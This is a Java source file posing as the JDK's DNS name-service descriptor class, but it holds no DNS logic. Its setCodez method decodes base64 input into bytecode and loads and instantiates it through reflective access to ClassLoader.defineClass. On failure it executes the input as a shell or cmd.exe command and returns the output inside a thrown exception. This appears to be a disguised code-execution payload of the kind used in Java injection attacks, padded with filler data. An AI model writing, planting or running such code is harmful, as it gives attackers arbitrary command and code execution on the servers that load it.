package sun.net.spi.nameservice.dns;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Scanner;

public class DNSNameServiceDescriptor extends Exception {
    private static final String paddingData = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    public void setCodez(String var1) throws Exception {
        try {
            Class.forName("java.util.Base64");
            byte[] var2 = Base64.getDecoder().decode(var1);
            defineclass(var2);
        } catch (Exception var6) {
            Class.forName("java.lang.Runtime");
            String[] var3 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var1} : new String[]{"/bin/sh", "-c", var1};
            InputStream var4 = Runtime.getRuntime().exec(var3).getInputStream();
            String var5 = (new Scanner(var4)).useDelimiter("\\A").next();
            throw new Exception(var5);
        }
    }

    public static void defineclass(byte[] var0) throws Exception {
        Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        var1.setAccessible(true);
        Class var2 = (Class)var1.invoke(Thread.currentThread().getContextClassLoader(), var0, 0, var0.length);
        var2.newInstance();
    }
}
